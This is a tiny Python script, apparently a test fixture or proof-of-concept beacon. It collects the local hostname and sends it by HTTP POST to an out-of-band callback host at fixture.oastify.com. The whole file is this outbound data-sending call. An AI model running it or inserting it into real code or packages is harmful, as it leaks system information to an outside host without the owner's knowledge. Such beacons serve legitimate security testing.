import json
import socket
import urllib.request

host = socket.gethostname()
request = urllib.request.Request(
    "https://fixture.oastify.com/callback",
    data=json.dumps({"host": host}).encode(),
    method="POST",
)
urllib.request.urlopen(request, timeout=5)
